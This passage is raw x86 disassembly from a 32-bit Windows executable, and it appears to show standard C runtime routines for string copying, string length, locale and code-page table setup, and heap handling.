  425779:	push   edi
  42577a:	call   esi
  42577c:	test   eax,eax
  42577e:	mov    ds:0x463880,eax
  425783:	je     0x425792
  425785:	push   0x429624
  42578a:	push   edi
  42578b:	call   esi
  42578d:	mov    ds:0x46387c,eax
  425792:	mov    eax,ds:0x46387c
  425797:	test   eax,eax
  425799:	je     0x4257d7
  42579b:	call   eax
  42579d:	test   eax,eax
  42579f:	je     0x4257be
  4257a1:	lea    ecx,[ebp-0x4]
  4257a4:	push   ecx
  4257a5:	push   0xc
  4257a7:	lea    ecx,[ebp-0x10]
  4257aa:	push   ecx
  4257ab:	push   0x1
  4257ad:	push   eax
  4257ae:	call   DWORD PTR ds:0x463880
  4257b4:	test   eax,eax
  4257b6:	je     0x4257be
  4257b8:	test   BYTE PTR [ebp-0x8],0x1
  4257bc:	jne    0x4257d7
  4257be:	cmp    DWORD PTR ds:0x4635d0,0x4
  4257c5:	jb     0x4257d1
  4257c7:	or     BYTE PTR [ebp+0x12],0x20
  4257cb:	jmp    0x4257f6
  4257cd:	xor    eax,eax
  4257cf:	jmp    0x425806
  4257d1:	or     BYTE PTR [ebp+0x12],0x4
  4257d5:	jmp    0x4257f6
  4257d7:	mov    eax,ds:0x463874
  4257dc:	test   eax,eax
  4257de:	je     0x4257f6
  4257e0:	call   eax
  4257e2:	mov    ebx,eax
  4257e4:	test   ebx,ebx
  4257e6:	je     0x4257f6
  4257e8:	mov    eax,ds:0x463878
  4257ed:	test   eax,eax
  4257ef:	je     0x4257f6
  4257f1:	push   ebx
  4257f2:	call   eax
  4257f4:	mov    ebx,eax
  4257f6:	push   DWORD PTR [ebp+0x10]
  4257f9:	push   DWORD PTR [ebp+0xc]
  4257fc:	push   DWORD PTR [ebp+0x8]
  4257ff:	push   ebx
  425800:	call   DWORD PTR ds:0x463870
  425806:	pop    edi
  425807:	pop    esi
  425808:	pop    ebx
  425809:	leave  
  42580a:	ret    
  42580b:	int3   
  42580c:	int3   
  42580d:	int3   
  42580e:	int3   
  42580f:	int3   
  425810:	push   edi
  425811:	mov    edi,DWORD PTR [esp+0x8]
  425815:	jmp    0x425885
  425817:	lea    esp,[esp+0x0]
  42581e:	mov    edi,edi
  425820:	mov    ecx,DWORD PTR [esp+0x4]
  425824:	push   edi
  425825:	test   ecx,0x3
  42582b:	je     0x425840
  42582d:	mov    al,BYTE PTR [ecx]
  42582f:	add    ecx,0x1
  425832:	test   al,al
  425834:	je     0x425873
  425836:	test   ecx,0x3
  42583c:	jne    0x42582d
  42583e:	mov    edi,edi
  425840:	mov    eax,DWORD PTR [ecx]
  425842:	mov    edx,0x7efefeff
  425847:	add    edx,eax
  425849:	xor    eax,0xffffffff
  42584c:	xor    eax,edx
  42584e:	add    ecx,0x4
  425851:	test   eax,0x81010100
  425856:	je     0x425840
  425858:	mov    eax,DWORD PTR [ecx-0x4]
  42585b:	test   al,al
  42585d:	je     0x425882
  42585f:	test   ah,ah
  425861:	je     0x42587d
  425863:	test   eax,0xff0000
  425868:	je     0x425878
  42586a:	test   eax,0xff000000
  42586f:	je     0x425873
  425871:	jmp    0x425840
  425873:	lea    edi,[ecx-0x1]
  425876:	jmp    0x425885
  425878:	lea    edi,[ecx-0x2]
  42587b:	jmp    0x425885
  42587d:	lea    edi,[ecx-0x3]
  425880:	jmp    0x425885
  425882:	lea    edi,[ecx-0x4]
  425885:	mov    ecx,DWORD PTR [esp+0xc]
  425889:	test   ecx,0x3
  42588f:	je     0x4258ae
  425891:	mov    dl,BYTE PTR [ecx]
  425893:	add    ecx,0x1
  425896:	test   dl,dl
  425898:	je     0x425900
  42589a:	mov    BYTE PTR [edi],dl
  42589c:	add    edi,0x1
  42589f:	test   ecx,0x3
  4258a5:	jne    0x425891
  4258a7:	jmp    0x4258ae
  4258a9:	mov    DWORD PTR [edi],edx
  4258ab:	add    edi,0x4
  4258ae:	mov    edx,0x7efefeff
  4258b3:	mov    eax,DWORD PTR [ecx]
  4258b5:	add    edx,eax
  4258b7:	xor    eax,0xffffffff
  4258ba:	xor    eax,edx
  4258bc:	mov    edx,DWORD PTR [ecx]
  4258be:	add    ecx,0x4
  4258c1:	test   eax,0x81010100
  4258c6:	je     0x4258a9
  4258c8:	test   dl,dl
  4258ca:	je     0x425900
  4258cc:	test   dh,dh
  4258ce:	je     0x4258f7
  4258d0:	test   edx,0xff0000
  4258d6:	je     0x4258ea
  4258d8:	test   edx,0xff000000
  4258de:	je     0x4258e2
  4258e0:	jmp    0x4258a9
  4258e2:	mov    DWORD PTR [edi],edx
  4258e4:	mov    eax,DWORD PTR [esp+0x8]
  4258e8:	pop    edi
  4258e9:	ret    
  4258ea:	mov    WORD PTR [edi],dx
  4258ed:	mov    eax,DWORD PTR [esp+0x8]
  4258f1:	mov    BYTE PTR [edi+0x2],0x0
  4258f5:	pop    edi
  4258f6:	ret    
  4258f7:	mov    WORD PTR [edi],dx
  4258fa:	mov    eax,DWORD PTR [esp+0x8]
  4258fe:	pop    edi
  4258ff:	ret    
  425900:	mov    BYTE PTR [edi],dl
  425902:	mov    eax,DWORD PTR [esp+0x8]
  425906:	pop    edi
  425907:	ret    
  425908:	int3   
  425909:	int3   
  42590a:	int3   
  42590b:	int3   
  42590c:	int3   
  42590d:	int3   
  42590e:	int3   
  42590f:	int3   
  425910:	mov    ecx,DWORD PTR [esp+0xc]
  425914:	push   edi
  425915:	test   ecx,ecx
  425917:	je     0x4259af
  42591d:	push   esi
  42591e:	push   ebx
  42591f:	mov    ebx,ecx
  425921:	mov    esi,DWORD PTR [esp+0x14]
  425925:	test   esi,0x3
  42592b:	mov    edi,DWORD PTR [esp+0x10]
  42592f:	jne    0x42593c
  425931:	shr    ecx,0x2
  425934:	jne    0x4259bf
  42593a:	jmp    0x425963
  42593c:	mov    al,BYTE PTR [esi]
  42593e:	add    esi,0x1
  425941:	mov    BYTE PTR [edi],al
  425943:	add    edi,0x1
  425946:	sub    ecx,0x1
  425949:	je     0x425976
  42594b:	test   al,al
  42594d:	je     0x42597e
  42594f:	test   esi,0x3
  425955:	jne    0x42593c
  425957:	mov    ebx,ecx
  425959:	shr    ecx,0x2
  42595c:	jne    0x4259bf
  42595e:	and    ebx,0x3
  425961:	je     0x425976
  425963:	mov    al,BYTE PTR [esi]
  425965:	add    esi,0x1
  425968:	mov    BYTE PTR [edi],al
  42596a:	add    edi,0x1
  42596d:	test   al,al
  42596f:	je     0x4259a8
  425971:	sub    ebx,0x1
  425974:	jne    0x425963
  425976:	mov    eax,DWORD PTR [esp+0x10]
  42597a:	pop    ebx
  42597b:	pop    esi
  42597c:	pop    edi
  42597d:	ret    
  42597e:	test   edi,0x3
  425984:	je     0x42599c
  425986:	mov    BYTE PTR [edi],al
  425988:	add    edi,0x1
  42598b:	sub    ecx,0x1
  42598e:	je     0x425a2c
  425994:	test   edi,0x3
  42599a:	jne    0x425986
  42599c:	mov    ebx,ecx
  42599e:	shr    ecx,0x2
  4259a1:	jne    0x425a17
  4259a3:	mov    BYTE PTR [edi],al
  4259a5:	add    edi,0x1
  4259a8:	sub    ebx,0x1
  4259ab:	jne    0x4259a3
  4259ad:	pop    ebx
  4259ae:	pop    esi
  4259af:	mov    eax,DWORD PTR [esp+0x8]
  4259b3:	pop    edi
  4259b4:	ret    
  4259b5:	mov    DWORD PTR [edi],edx
  4259b7:	add    edi,0x4
  4259ba:	sub    ecx,0x1
  4259bd:	je     0x42595e
  4259bf:	mov    edx,0x7efefeff
  4259c4:	mov    eax,DWORD PTR [esi]
  4259c6:	add    edx,eax
  4259c8:	xor    eax,0xffffffff
  4259cb:	xor    eax,edx
  4259cd:	mov    edx,DWORD PTR [esi]
  4259cf:	add    esi,0x4
  4259d2:	test   eax,0x81010100
  4259d7:	je     0x4259b5
  4259d9:	test   dl,dl
  4259db:	je     0x425a09
  4259dd:	test   dh,dh
  4259df:	je     0x4259ff
  4259e1:	test   edx,0xff0000
  4259e7:	je     0x4259f5
  4259e9:	test   edx,0xff000000
  4259ef:	jne    0x4259b5
  4259f1:	mov    DWORD PTR [edi],edx
  4259f3:	jmp    0x425a0d
  4259f5:	and    edx,0xffff
  4259fb:	mov    DWORD PTR [edi],edx
  4259fd:	jmp    0x425a0d
  4259ff:	and    edx,0xff
  425a05:	mov    DWORD PTR [edi],edx
  425a07:	jmp    0x425a0d
  425a09:	xor    edx,edx
  425a0b:	mov    DWORD PTR [edi],edx
  425a0d:	add    edi,0x4
  425a10:	xor    eax,eax
  425a12:	sub    ecx,0x1
  425a15:	je     0x425a23
  425a17:	xor    eax,eax
  425a19:	mov    DWORD PTR [edi],eax
  425a1b:	add    edi,0x4
  425a1e:	sub    ecx,0x1
  425a21:	jne    0x425a19
  425a23:	and    ebx,0x3
  425a26:	jne    0x4259a3
  425a2c:	mov    eax,DWORD PTR [esp+0x10]
  425a30:	pop    ebx
  425a31:	pop    esi
  425a32:	pop    edi
  425a33:	ret    
  425a34:	int3   
  425a35:	int3   
  425a36:	int3   
  425a37:	int3   
  425a38:	int3   
  425a39:	int3   
  425a3a:	int3   
  425a3b:	int3   
  425a3c:	int3   
  425a3d:	int3   
  425a3e:	int3   
  425a3f:	int3   
  425a40:	mov    ecx,DWORD PTR [esp+0x4]
  425a44:	test   ecx,0x3
  425a4a:	je     0x425a70
  425a4c:	mov    al,BYTE PTR [ecx]
  425a4e:	add    ecx,0x1
  425a51:	test   al,al
  425a53:	je     0x425aa3
  425a55:	test   ecx,0x3
  425a5b:	jne    0x425a4c
  425a5d:	add    eax,0x0
  425a62:	lea    esp,[esp+0x0]
  425a69:	lea    esp,[esp+0x0]
  425a70:	mov    eax,DWORD PTR [ecx]
  425a72:	mov    edx,0x7efefeff
  425a77:	add    edx,eax
  425a79:	xor    eax,0xffffffff
  425a7c:	xor    eax,edx
  425a7e:	add    ecx,0x4
  425a81:	test   eax,0x81010100
  425a86:	je     0x425a70
  425a88:	mov    eax,DWORD PTR [ecx-0x4]
  425a8b:	test   al,al
  425a8d:	je     0x425ac1
  425a8f:	test   ah,ah
  425a91:	je     0x425ab7
  425a93:	test   eax,0xff0000
  425a98:	je     0x425aad
  425a9a:	test   eax,0xff000000
  425a9f:	je     0x425aa3
  425aa1:	jmp    0x425a70
  425aa3:	lea    eax,[ecx-0x1]
  425aa6:	mov    ecx,DWORD PTR [esp+0x4]
  425aaa:	sub    eax,ecx
  425aac:	ret    
  425aad:	lea    eax,[ecx-0x2]
  425ab0:	mov    ecx,DWORD PTR [esp+0x4]
  425ab4:	sub    eax,ecx
  425ab6:	ret    
  425ab7:	lea    eax,[ecx-0x3]
  425aba:	mov    ecx,DWORD PTR [esp+0x4]
  425abe:	sub    eax,ecx
  425ac0:	ret    
  425ac1:	lea    eax,[ecx-0x4]
  425ac4:	mov    ecx,DWORD PTR [esp+0x4]
  425ac8:	sub    eax,ecx
  425aca:	ret    
  425acb:	push   0x8
  425acd:	push   0x429698
  425ad2:	call   0x425434
  425ad7:	and    DWORD PTR [ebp-0x4],0x0
  425adb:	push   0x0
  425add:	push   0x1
  425adf:	call   0x427652
  425ae4:	pop    ecx
  425ae5:	pop    ecx
  425ae6:	jmp    0x425aef
  425ae8:	xor    eax,eax
  425aea:	inc    eax
  425aeb:	ret    
  425aec:	mov    esp,DWORD PTR [ebp-0x18]
  425aef:	or     DWORD PTR [ebp-0x4],0xffffffff
  425af3:	push   0x3
  425af5:	call   DWORD PTR ds:0x42909c
  425afb:	int3   
  425afc:	cmp    ecx,DWORD PTR ds:0x462f30
  425b02:	jne    0x425b05
  425b04:	ret    
  425b05:	jmp    0x425acb
  425b0a:	movzx  eax,BYTE PTR [esp+0x4]
  425b0f:	mov    cl,BYTE PTR [esp+0xc]
  425b13:	test   BYTE PTR [eax+0x463a21],cl
  425b19:	jne    0x425b37
  425b1b:	cmp    DWORD PTR [esp+0x8],0x0
  425b20:	je     0x425b30
  425b22:	movzx  eax,WORD PTR [eax*2+0x429a92]
  425b2a:	and    eax,DWORD PTR [esp+0x8]
  425b2e:	jmp    0x425b32
  425b30:	xor    eax,eax
  425b32:	test   eax,eax
  425b34:	jne    0x425b37
  425b36:	ret    
  425b37:	xor    eax,eax
  425b39:	inc    eax
  425b3a:	ret    
  425b3b:	push   0x4
  425b3d:	push   0x0
  425b3f:	push   DWORD PTR [esp+0xc]
  425b43:	call   0x425b0a
  425b48:	add    esp,0xc
  425b4b:	ret    
  425b4c:	sub    eax,0x3a4
  425b51:	je     0x425b75
  425b53:	sub    eax,0x4
  425b56:	je     0x425b6f
  425b58:	sub    eax,0xd
  425b5b:	je     0x425b69
  425b5d:	dec    eax
  425b5e:	je     0x425b63
  425b60:	xor    eax,eax
  425b62:	ret    
  425b63:	mov    eax,0x404
  425b68:	ret    
  425b69:	mov    eax,0x412
  425b6e:	ret    
  425b6f:	mov    eax,0x804
  425b74:	ret    
  425b75:	mov    eax,0x411
  425b7a:	ret    
  425b7b:	push   edi
  425b7c:	push   0x40
  425b7e:	xor    eax,eax
  425b80:	pop    ecx
  425b81:	mov    edi,0x463a20
  425b86:	rep stos DWORD PTR es:[edi],eax
  425b88:	stos   BYTE PTR es:[edi],al
  425b89:	xor    eax,eax
  425b8b:	mov    ds:0x463b24,eax
  425b90:	mov    ds:0x463a1c,eax
  425b95:	mov    ds:0x463a14,eax
  425b9a:	mov    edi,0x463b30
  425b9f:	stos   DWORD PTR es:[edi],eax
  425ba0:	stos   DWORD PTR es:[edi],eax
  425ba1:	stos   DWORD PTR es:[edi],eax
  425ba2:	pop    edi
  425ba3:	ret    
  425ba4:	push   ebp
  425ba5:	mov    ebp,esp
  425ba7:	sub    esp,0x518
  425bad:	mov    eax,ds:0x462f30
  425bb2:	xor    eax,DWORD PTR [ebp+0x4]
  425bb5:	push   esi
  425bb6:	mov    DWORD PTR [ebp-0x4],eax
  425bb9:	lea    eax,[ebp-0x18]
  425bbc:	push   eax
  425bbd:	push   DWORD PTR ds:0x463b24
  425bc3:	call   DWORD PTR ds:0x429104
  425bc9:	cmp    eax,0x1
  425bcc:	mov    esi,0x100
  425bd1:	jne    0x425ce4
  425bd7:	xor    eax,eax
  425bd9:	mov    BYTE PTR [ebp+eax*1-0x118],al
  425be0:	inc    eax
  425be1:	cmp    eax,esi
  425be3:	jb     0x425bd9
  425be5:	mov    al,BYTE PTR [ebp-0x12]
  425be8:	test   al,al
  425bea:	mov    BYTE PTR [ebp-0x118],0x20
  425bf1:	je     0x425c29
  425bf3:	push   ebx
  425bf4:	lea    edx,[ebp-0x11]
  425bf7:	push   edi
  425bf8:	movzx  ecx,BYTE PTR [edx]
  425bfb:	movzx  eax,al
  425bfe:	cmp    eax,ecx
  425c00:	ja     0x425c1f
  425c02:	sub    ecx,eax
  425c04:	inc    ecx
  425c05:	mov    ebx,ecx
  425c07:	shr    ecx,0x2
  425c0a:	lea    edi,[ebp+eax*1-0x118]
  425c11:	mov    eax,0x20202020
  425c16:	rep stos DWORD PTR es:[edi],eax
  425c18:	mov    ecx,ebx
  425c1a:	and    ecx,0x3
  425c1d:	rep stos BYTE PTR es:[edi],al
  425c1f:	inc    edx
  425c20:	mov    al,BYTE PTR [edx]
  425c22:	inc    edx
  425c23:	test   al,al
  425c25:	jne    0x425bf8
  425c27:	pop    edi
  425c28:	pop    ebx
  425c29:	push   0x0
  425c2b:	push   DWORD PTR ds:0x463a14
  425c31:	lea    eax,[ebp-0x518]
  425c37:	push   DWORD PTR ds:0x463b24
  425c3d:	push   eax
  425c3e:	push   esi
  425c3f:	lea    eax,[ebp-0x118]
  425c45:	push   eax
  425c46:	push   0x1
  425c48:	call   0x427b58
  425c4d:	push   0x0
  425c4f:	push   DWORD PTR ds:0x463b24
  425c55:	lea    eax,[ebp-0x218]
  425c5b:	push   esi
  425c5c:	push   eax
  425c5d:	push   esi
  425c5e:	lea    eax,[ebp-0x118]
  425c64:	push   eax
  425c65:	push   esi
  425c66:	push   DWORD PTR ds:0x463a14
  425c6c:	call   0x42779c
  425c71:	push   0x0
  425c73:	push   DWORD PTR ds:0x463b24
  425c79:	lea    eax,[ebp-0x318]
  425c7f:	push   esi
  425c80:	push   eax
  425c81:	push   esi
  425c82:	lea    eax,[ebp-0x118]
  425c88:	push   eax
  425c89:	push   0x200
  425c8e:	push   DWORD PTR ds:0x463a14
  425c94:	call   0x42779c
  425c99:	add    esp,0x5c
  425c9c:	xor    eax,eax
  425c9e:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  425ca6:	test   cl,0x1
  425ca9:	je     0x425cc1
  425cab:	or     BYTE PTR [eax+0x463a21],0x10
  425cb2:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  425cb9:	mov    BYTE PTR [eax+0x463b40],cl
  425cbf:	jmp    0x425cdd
  425cc1:	test   cl,0x2
  425cc4:	je     0x425cd6
  425cc6:	or     BYTE PTR [eax+0x463a21],0x20
  425ccd:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  425cd4:	jmp    0x425cb9
  425cd6:	and    BYTE PTR [eax+0x463b40],0x0
  425cdd:	inc    eax
  425cde:	cmp    eax,esi
  425ce0:	jb     0x425c9e
  425ce2:	jmp    0x425d28
  425ce4:	xor    eax,eax
  425ce6:	cmp    eax,0x41
  425ce9:	jb     0x425d04
  425ceb:	cmp    eax,0x5a
  425cee:	ja     0x425d04
  425cf0:	or     BYTE PTR [eax+0x463a21],0x10
  425cf7:	mov    cl,al
  425cf9:	add    cl,0x20
  425cfc:	mov    BYTE PTR [eax+0x463b40],cl
  425d02:	jmp    0x425d23
  425d04:	cmp    eax,0x61
  425d07:	jb     0x425d1c
  425d09:	cmp    eax,0x7a
  425d0c:	ja     0x425d1c
  425d0e:	or     BYTE PTR [eax+0x463a21],0x20
  425d15:	mov    cl,al
  425d17:	sub    cl,0x20
  425d1a:	jmp    0x425cfc
  425d1c:	and    BYTE PTR [eax+0x463b40],0x0
  425d23:	inc    eax
  425d24:	cmp    eax,esi
  425d26:	jb     0x425ce6
  425d28:	mov    ecx,DWORD PTR [ebp-0x4]
  425d2b:	xor    ecx,DWORD PTR [ebp+0x4]
  425d2e:	pop    esi
  425d2f:	call   0x425afc
  425d34:	leave  
  425d35:	ret    
  425d36:	push   ebp
  425d37:	mov    ebp,esp
  425d39:	sub    esp,0x1c
  425d3c:	mov    eax,ds:0x462f30
  425d41:	xor    eax,DWORD PTR [ebp+0x4]
  425d44:	push   ebx
  425d45:	push   esi
  425d46:	mov    esi,DWORD PTR [ebp+0x8]
  425d49:	xor    ebx,ebx
  425d4b:	cmp    esi,ebx
  425d4d:	mov    DWORD PTR [ebp-0x4],eax
  425d50:	push   edi
  425d51:	je     0x425eab
  425d57:	xor    edx,edx
  425d59:	xor    eax,eax
  425d5b:	cmp    DWORD PTR [eax+0x462f40],esi
  425d61:	je     0x425dc8
  425d63:	add    eax,0x30
  425d66:	inc    edx
  425d67:	cmp    eax,0xf0
  425d6c:	jb     0x425d5b
  425d6e:	lea    eax,[ebp-0x1c]
  425d71:	push   eax
  425d72:	push   esi
  425d73:	call   DWORD PTR ds:0x429104
  425d79:	cmp    eax,0x1
  425d7c:	jne    0x425ea3
  425d82:	push   0x40
  425d84:	xor    eax,eax
  425d86:	cmp    DWORD PTR [ebp-0x1c],0x1
  425d8a:	pop    ecx
  425d8b:	mov    edi,0x463a20
  425d90:	rep stos DWORD PTR es:[edi],eax
  425d92:	stos   BYTE PTR es:[edi],al
  425d93:	mov    DWORD PTR ds:0x463b24,esi
  425d99:	mov    DWORD PTR ds:0x463a14,ebx
  425d9f:	jbe    0x425e91
  425da5:	cmp    BYTE PTR [ebp-0x16],0x0
  425da9:	je     0x425e69
  425daf:	lea    ecx,[ebp-0x15]
  425db2:	mov    dl,BYTE PTR [ecx]
  425db4:	test   dl,dl
  425db6:	je     0x425e69
  425dbc:	movzx  eax,BYTE PTR [ecx-0x1]
  425dc0:	movzx  edx,dl
  425dc3:	jmp    0x425e59
  425dc8:	push   0x40
  425dca:	xor    eax,eax
  425dcc:	pop    ecx
  425dcd:	mov    edi,0x463a20
  425dd2:	rep stos DWORD PTR es:[edi],eax
  425dd4:	lea    ecx,[edx+edx*2]
  425dd7:	shl    ecx,0x4
  425dda:	mov    DWORD PTR [ebp-0x8],ebx
  425ddd:	stos   BYTE PTR es:[edi],al
  425dde:	lea    ebx,[ecx+0x462f50]
  425de4:	mov    al,BYTE PTR [ebx]
  425de6:	mov    esi,ebx
  425de8:	jmp    0x425e13
  425dea:	mov    dl,BYTE PTR [esi+0x1]
  425ded:	test   dl,dl
  425def:	je     0x425e17
  425df1:	movzx  eax,al
  425df4:	movzx  edi,dl
  425df7:	cmp    eax,edi
  425df9:	ja     0x425e0f
  425dfb:	mov    edx,DWORD PTR [ebp-0x8]
  425dfe:	mov    dl,BYTE PTR [edx+0x462f38]
  425e04:	or     BYTE PTR [eax+0x463a21],dl
  425e0a:	inc    eax
  425e0b:	cmp    eax,edi
  425e0d:	jbe    0x425e04
  425e0f:	inc    esi
  425e10:	inc    esi
  425e11:	mov    al,BYTE PTR [esi]
  425e13:	test   al,al
  425e15:	jne    0x425dea
  425e17:	inc    DWORD PTR [ebp-0x8]
  425e1a:	add    ebx,0x8
  425e1d:	cmp    DWORD PTR [ebp-0x8],0x4
  425e21:	jb     0x425de4
  425e23:	mov    eax,DWORD PTR [ebp+0x8]
  425e26:	mov    ds:0x463b24,eax
  425e2b:	mov    DWORD PTR ds:0x463a1c,0x1
  425e35:	call   0x425b4c
  425e3a:	lea    ecx,[ecx+0x462f44]
  425e40:	mov    esi,ecx
  425e42:	mov    edi,0x463b30
  425e47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425e48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425e49:	mov    ds:0x463a14,eax
  425e4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425e4f:	jmp    0x425eb0
  425e51:	or     BYTE PTR [eax+0x463a21],0x4
  425e58:	inc    eax
  425e59:	cmp    eax,edx
  425e5b:	jbe    0x425e51
  425e5d:	inc    ecx
  425e5e:	inc    ecx
  425e5f:	cmp    BYTE PTR [ecx-0x1],0x0
  425e63:	jne    0x425db2
  425e69:	xor    ecx,ecx
  425e6b:	inc    ecx
  425e6c:	mov    eax,ecx
  425e6e:	or     BYTE PTR [eax+0x463a21],0x8
  425e75:	inc    eax
  425e76:	cmp    eax,0xff
  425e7b:	jb     0x425e6e
  425e7d:	mov    eax,esi
  425e7f:	call   0x425b4c
  425e84:	mov    ds:0x463a14,eax
  425e89:	mov    DWORD PTR ds:0x463a1c,ecx
  425e8f:	jmp    0x425e97
  425e91:	mov    DWORD PTR ds:0x463a1c,ebx
  425e97:	xor    eax,eax
  425e99:	mov    edi,0x463b30
  425e9e:	stos   DWORD PTR es:[edi],eax
  425e9f:	stos   DWORD PTR es:[edi],eax
  425ea0:	stos   DWORD PTR es:[edi],eax
  425ea1:	jmp    0x425eb0
  425ea3:	cmp    DWORD PTR ds:0x463884,ebx
  425ea9:	je     0x425eb9
  425eab:	call   0x425b7b
  425eb0:	call   0x425ba4
  425eb5:	xor    eax,eax
  425eb7:	jmp    0x425ebc
  425eb9:	or     eax,0xffffffff
  425ebc:	mov    ecx,DWORD PTR [ebp-0x4]
  425ebf:	xor    ecx,DWORD PTR [ebp+0x4]
  425ec2:	pop    edi
  425ec3:	pop    esi
  425ec4:	pop    ebx
  425ec5:	call   0x425afc
  425eca:	leave  
  425ecb:	ret    
  425ecc:	push   0x14
  425ece:	push   0x4296a8
  425ed3:	call   0x425434
  425ed8:	or     DWORD PTR [ebp-0x1c],0xffffffff
  425edc:	push   0xd
  425ede:	call   0x4255ef
  425ee3:	pop    ecx
  425ee4:	xor    edi,edi
  425ee6:	mov    DWORD PTR [ebp-0x4],edi
  425ee9:	mov    DWORD PTR ds:0x463884,edi
  425eef:	mov    eax,DWORD PTR [ebp+0x8]
  425ef2:	cmp    eax,0xfffffffe
  425ef5:	jne    0x425f09
  425ef7:	mov    DWORD PTR ds:0x463884,0x1
  425f01:	call   DWORD PTR ds:0x429100
  425f07:	jmp    0x425f34
  425f09:	cmp    eax,0xfffffffd
  425f0c:	jne    0x425f20
  425f0e:	mov    DWORD PTR ds:0x463884,0x1
  425f18:	call   DWORD PTR ds:0x4290fc
  425f1e:	jmp    0x425f34
  425f20:	cmp    eax,0xfffffffc
  425f23:	jne    0x425f34
  425f25:	mov    DWORD PTR ds:0x463884,0x1
  425f2f:	mov    eax,ds:0x4638b4
  425f34:	mov    DWORD PTR [ebp+0x8],eax
  425f37:	cmp    eax,DWORD PTR ds:0x463b24
  425f3d:	je     0x425ffe
  425f43:	mov    esi,DWORD PTR ds:0x463a18
  425f49:	mov    DWORD PTR [ebp-0x20],esi
  425f4c:	cmp    esi,edi
  425f4e:	je     0x425f54
  425f50:	cmp    DWORD PTR [esi],edi
  425f52:	je     0x425f64
  425f54:	push   0x220
  425f59:	call   0x426152
  425f5e:	pop    ecx
  425f5f:	mov    esi,eax
  425f61:	mov    DWORD PTR [ebp-0x20],esi
  425f64:	cmp    esi,edi
  425f66:	je     0x425fe7
  425f68:	push   DWORD PTR [ebp+0x8]
  425f6b:	call   0x425d36
  425f70:	pop    ecx
  425f71:	mov    DWORD PTR [ebp-0x1c],eax
  425f74:	cmp    eax,edi
  425f76:	jne    0x425fe7
  425f78:	mov    DWORD PTR [esi],edi
  425f7a:	mov    eax,ds:0x463b24
  425f7f:	mov    DWORD PTR [esi+0x4],eax
  425f82:	mov    eax,ds:0x463a1c
  425f87:	mov    DWORD PTR [esi+0x8],eax
  425f8a:	mov    eax,ds:0x463a14
  425f8f:	mov    DWORD PTR [esi+0xc],eax
  425f92:	xor    eax,eax
  425f94:	mov    DWORD PTR [ebp-0x24],eax
  425f97:	cmp    eax,0x5
  425f9a:	jge    0x425fac
  425f9c:	mov    cx,WORD PTR [eax*2+0x463b30]
  425fa4:	mov    WORD PTR [esi+eax*2+0x10],cx
  425fa9:	inc    eax
  425faa:	jmp    0x425f94
  425fac:	xor    eax,eax
  425fae:	mov    DWORD PTR [ebp-0x24],eax
  425fb1:	cmp    eax,0x101
  425fb6:	jge    0x425fc5
  425fb8:	mov    cl,BYTE PTR [eax+0x463a20]
  425fbe:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  425fc2:	inc    eax
  425fc3:	jmp    0x425fae
  425fc5:	xor    eax,eax
  425fc7:	mov    DWORD PTR [ebp-0x24],eax
  425fca:	cmp    eax,0x100
  425fcf:	jge    0x425fe1
  425fd1:	mov    cl,BYTE PTR [eax+0x463b40]
  425fd7:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  425fde:	inc    eax
  425fdf:	jmp    0x425fc7
  425fe1:	mov    DWORD PTR ds:0x463a18,esi
  425fe7:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  425feb:	jne    0x426001
  425fed:	cmp    esi,DWORD PTR ds:0x463a18
  425ff3:	je     0x426001
  425ff5:	push   esi
  425ff6:	call   0x42603a
  425ffb:	pop    ecx
  425ffc:	jmp    0x426001
  425ffe:	mov    DWORD PTR [ebp-0x1c],edi
  426001:	or     DWORD PTR [ebp-0x4],0xffffffff
  426005:	call   0x426013
  42600a:	mov    eax,DWORD PTR [ebp-0x1c]
  42600d:	call   0x42546f
  426012:	ret    
  426013:	push   0xd
  426015:	call   0x42555b
  42601a:	pop    ecx
  42601b:	ret    
  42601c:	cmp    DWORD PTR ds:0x463d6c,0x0
  426023:	jne    0x426037
  426025:	push   0xfffffffd
  426027:	call   0x425ecc
  42602c:	pop    ecx
  42602d:	mov    DWORD PTR ds:0x463d6c,0x1
  426037:	xor    eax,eax
  426039:	ret    
  42603a:	push   0xc
  42603c:	push   0x4296b8
  426041:	call   0x425434
  426046:	mov    esi,DWORD PTR [ebp+0x8]
  426049:	test   esi,esi
  42604b:	je     0x4260a5
  42604d:	cmp    DWORD PTR ds:0x463c44,0x3
  426054:	jne    0x426096
  426056:	push   0x4
  426058:	call   0x4255ef
  42605d:	pop    ecx
  42605e:	and    DWORD PTR [ebp-0x4],0x0
  426062:	push   esi
  426063:	call   0x426812
  426068:	pop    ecx
  426069:	mov    DWORD PTR [ebp-0x1c],eax
  42606c:	test   eax,eax
  42606e:	je     0x426079
  426070:	push   esi
  426071:	push   eax
  426072:	call   0x42683d
  426077:	pop    ecx
  426078:	pop    ecx
  426079:	or     DWORD PTR [ebp-0x4],0xffffffff
  42607d:	call   0x42608d
  426082:	cmp    DWORD PTR [ebp-0x1c],0x0
  426086:	jne    0x4260a5
  426088:	push   DWORD PTR [ebp+0x8]
  42608b:	jmp    0x426097
  42608d:	push   0x4
  42608f:	call   0x42555b
  426094:	pop    ecx
  426095:	ret    
  426096:	push   esi
  426097:	push   0x0
  426099:	push   DWORD PTR ds:0x463c40
  42609f:	call   DWORD PTR ds:0x429034
  4260a5:	call   0x42546f
  4260aa:	ret    
  4260ab:	push   0xc
  4260ad:	push   0x4296c8
  4260b2:	call   0x425434
  4260b7:	mov    esi,DWORD PTR [ebp+0x8]
  4260ba:	cmp    DWORD PTR ds:0x463c44,0x3
  4260c1:	jne    0x4260f1
  4260c3:	cmp    esi,DWORD PTR ds:0x463a04
  4260c9:	ja     0x4260f1
  4260cb:	push   0x4
  4260cd:	call   0x4255ef
  4260d2:	pop    ecx
  4260d3:	and    DWORD PTR [ebp-0x4],0x0
  4260d7:	push   esi
  4260d8:	call   0x426ff1
  4260dd:	pop    ecx
  4260de:	mov    DWORD PTR [ebp-0x1c],eax
  4260e1:	or     DWORD PTR [ebp-0x4],0xffffffff
  4260e5:	call   0x42611d
  4260ea:	mov    eax,DWORD PTR [ebp-0x1c]
  4260ed:	test   eax,eax
  4260ef:	jne    0x426114
  4260f1:	test   esi,esi
